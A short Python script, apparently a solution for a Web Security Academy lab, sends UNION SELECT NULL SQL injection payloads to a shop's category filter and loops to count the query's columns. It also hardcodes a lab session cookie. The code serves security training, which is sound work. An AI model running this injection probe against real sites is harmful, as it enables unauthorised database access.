import requests

cookies = {
    'session': 'bpwdbo8RYg5RizmJZ5v9jPb7u9ENQfu9',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Referer': 'https://0a65000d0335c09a818b5cbb001900b1.web-security-academy.net/',
    'Connection': 'keep-alive',
    'Cookie': 'session=bpwdbo8RYg5RizmJZ5v9jPb7u9ENQfu9',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=0, i',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
}

category = "'+UNION+SELECT+NULL--"

params = {
    'category': category,
}

response = requests.get(
    'https://0a65000d0335c09a818b5cbb001900b1.web-security-academy.net/filter',
    params=params,
    cookies=cookies,
    headers=headers,
)

print(response.status_code, params)
for i in range(100):
    category = category[:-2] +f",NULL--"
    params = {
        'category': category,
    }

    response = requests.get(
        'https://0a65000d0335c09a818b5cbb001900b1.web-security-academy.net/filter',
        params=params,
        cookies=cookies,
        headers=headers,
    )

    if response.status_code != 500:
        print(response.status_code, i+2)

